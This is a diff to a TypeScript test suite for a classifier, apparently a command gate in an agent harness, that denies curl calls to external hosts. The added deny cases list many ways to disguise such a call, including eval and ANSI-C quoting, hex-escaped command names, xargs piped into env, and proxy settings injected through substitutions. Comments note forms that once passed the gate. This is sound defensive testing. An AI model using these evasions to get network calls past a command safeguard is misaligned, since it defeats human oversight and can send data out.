@@ -4,6 +4,9 @@
 // 2. -K / --config: url / proxy lines the argv never shows.
 // 3. shell expansion the assignment reading does not take ($1, $@, arrays, +=, read, set -A, ...).
 // Round 3 (didi 36034): every glued head form, a computed variable name, `unset` stays allowed.
+// Round 5 (didi 36152): eval -- / builtin eval / eval $'...', BSD xargs -J, env -- {}, a command
+// xargs reads from stdin, a substitution's output as an assignment; found on the way: a $'curl' or
+// $X command word, builtin command curl.
 // Round 2 (didi 36014): slashes after the scheme, a glued f()( body, a proxy variable.
 // Found on the way (dexter): a function body (`f(){ curl ...; }; f`) and a subshell's closing `)`
 // glued to the URL (`(curl -s http://evil.example.com)`) both passed the running gate.
@@ -106,6 +109,25 @@ const mustDeny: Array<[string, string]> = [
   ['xargs env with its own replace string', 'echo a | xargs -I X env X curl -s http://localhost:3420/'],
   ['eval of a quoted external curl', `eval "curl -s https://${EV}/x"`],
   ['eval of bare external curl words', `eval curl -s https://${EV}/x`],
+  // round 5 (didi 36152); stdin comes from an outside variable, so no external host is in the text
+  ['eval --', `eval -- curl -s https://${EV}/x`],
+  ['builtin eval', `builtin eval curl -s https://${EV}/x`],
+  ['eval of an ANSI-C quoted line', `eval $'curl -s https://${EV}/x'`],
+  ['an ANSI-C quoted command word', `$'curl' -s https://${EV}/x`],
+  ['eval of an ANSI-C line with a newline', `eval $'echo hi\\ncurl -s https://${EV}/x'`],
+  ['an ANSI-C escape in the command word', `$'\\x63url' -s https://${EV}/x`],
+  ['builtin command curl', `builtin command curl -s https://${EV}/x`],
+  ['BSD xargs -J into env', 'echo "$P" | xargs -J % env % curl -s http://localhost:3420/'],
+  ['xargs env -- {}', 'echo "$P" | xargs -I{} env -- {} curl -s http://localhost:3420/'],
+  ['xargs env, the command from stdin', 'echo "$C" | xargs env'],
+  ['xargs nohup, the command from stdin', 'echo "$C" | xargs -0 nohup'],
+  ['xargs, the replace string as the command', 'echo "$C" | xargs -I{} {} http://localhost:3420/'],
+  ['export of a substitution', `v=http_; export $(echo \${v}proxy=http://${EV}:1); curl -s http://localhost:3420/`],
+  ['env of a substitution', 'env $(cat /tmp/p.env) curl -s http://localhost:3420/'],
+  ['export of a file', 'export $(cat /tmp/p.env); curl -s http://localhost:3420/'],
+  ['export of a variable', 'export $P; curl -s http://localhost:3420/'],
+  ['an assigned command variable', `X=curl; $X https://${EV}/`],
+  ['a computed export in a bash heredoc', `bash <<'EOF'\nv=http_; export $(echo \${v}proxy=http://${EV}:1); curl -s http://localhost:3420/\nEOF`],
   // the array a lifted rest inherits is read in full, an external word in it still denies
   ['an array URL after an unclosed backtick', `U=(https://${EV}/x); python3 -c "print('\`')"\ncurl -s "\${U[@]}"`],
   ['an array written in the lifted rest too', `H=(-H a); python3 -c "print('\`')"\nH+=(https://${EV}/x); curl "\${H[@]}" http://localhost:3420/`],
@@ -141,6 +163,15 @@ const mustPass: Array<[string, string]> = [
   ['xargs replace in the URL path', 'echo a | xargs -I{} curl -s http://localhost:3420/{}'],
   ['an export with a plain name and a computed value', 'export PATH="$HOME/bin:$PATH"; curl -s http://localhost:3420/api'],
   ['f () { ... } local', 'f () { curl -s http://localhost:3420/api; }; f'],
+  // round 5: the replace string in the command's own arguments names no variable (didi 36152 item 4)
+  ['xargs env FOO=1, the replace string in the URL', 'echo api | xargs -I{} env FOO=1 curl -s http://localhost:3420/{}'],
+  ['bare xargs (its echo)', 'echo a b | xargs'],
+  ['xargs -I{} rm {}', 'find . -name x | xargs -I{} rm {}'],
+  ['eval of an ANSI-C quoted local curl', "eval $'curl -s http://localhost:3420/api'"],
+  ['ANSI-C quoting outside a curl', "printf $'a\\tb\\n'"],
+  ['an assigned command variable, local', 'X=curl; $X -s http://localhost:3420/api'],
+  // fleet replay: an eval / export quoted in a message heredoc is text, not this shell's words
+  ['eval and export in a message heredoc', 'cat <<\'EOF\' > m.txt\neval "$(cat <<X)" and export $(y)\nEOF\ncurl -s http://localhost:3420/api'],
   // fleet replay (ford): an unclosed backtick lifts the rest of the line; the array written before it holds
   ['the header array before an unclosed backtick', 'H=(-H "A: b"); curl -s "${H[@]}" http://localhost:3420/x | python3 -c "print(\'`\' in \'x\')"\ncurl -s "${H[@]}" http://localhost:3420/y'],
 ]
@@ -174,6 +205,14 @@ describe('card d6b95892: curl destinations the parser cannot read are denied', (
     ['a fed read', `while read u; do curl -s "$u"; done <<< "https://${EV}/"`],
   ])('reads the host of %s', (_name, cmd) => {
     expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'curl-external', hosts: [EV] })
+  })
+  // round 5: the replace string in front of env's command is an assignment, so the real target
+  // is read and named, not only an unread stdin command
+  it.each([
+    ['BSD xargs -J into env', `echo "$P" | xargs -J % env % curl -s https://${EV}/x`],
+    ['xargs env -- {}', `echo "$P" | xargs -I{} env -- {} curl -s https://${EV}/x`],
+  ])('reads the curl target behind %s', (_name, cmd) => {
+    expect(classify(cmd), cmd).toMatchObject({ deny: true, reason: 'xargs-external', hosts: [EV] })
   })
   it('reads the host of an eval body, under its own reason', () => {
     const cmd = `eval "curl -s https://${EV}/x"`
